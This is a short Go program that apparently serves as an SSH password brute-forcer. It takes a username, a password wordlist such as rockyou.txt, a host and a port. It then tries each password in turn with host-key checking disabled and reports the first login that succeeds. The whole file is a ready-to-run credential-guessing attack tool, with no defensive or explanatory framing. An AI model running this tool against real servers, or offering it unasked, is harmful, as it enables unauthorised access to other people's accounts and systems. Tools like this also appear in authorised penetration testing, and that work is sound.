package main

import (
    "bufio"
    "fmt"
    "log"
    "net"
    "os"

    "golang.org/x/crypto/ssh"
)

func printUsage() {
    fmt.Printf(`
Usage:
    ` + os.Args[0] + ` <user> <passwordlist> <url> <port>

Example:
    ` + os.Args[0] + ` root rockyou.txt 127.0.0.1 22

`)
}

func checkArgs() (string, string, string, string) {
    if len(os.Args) != 5 {
        printUsage();
        os.Exit(1)
    }

    return os.Args[1], os.Args[2], os.Args[3], os.Args[4]
}

func main() {
    user, passwordlist, url, port := checkArgs()

    passwordFile, err := os.Open(passwordlist)
    if err != nil {
        log.Fatal(err)
    }
    defer passwordFile.Close()

    scanner := bufio.NewScanner(passwordFile)
    address := net.JoinHostPort(url, port)

    for scanner.Scan() {
        password := scanner.Text()

        config := &ssh.ClientConfig {
            User: user,
            Auth: []ssh.AuthMethod {
                ssh.Password(password),
            },
            HostKeyCallback: ssh.InsecureIgnoreHostKey(),
        }

        _, err := ssh.Dial("tcp", address, config)
        if err != nil {
            fmt.Printf("[-] User: %s Password: %s\n", user, password)
        } else {
            fmt.Printf("[+] User: %s Password: %s\n", user, password)
            os.Exit(0)
        }
    }
}
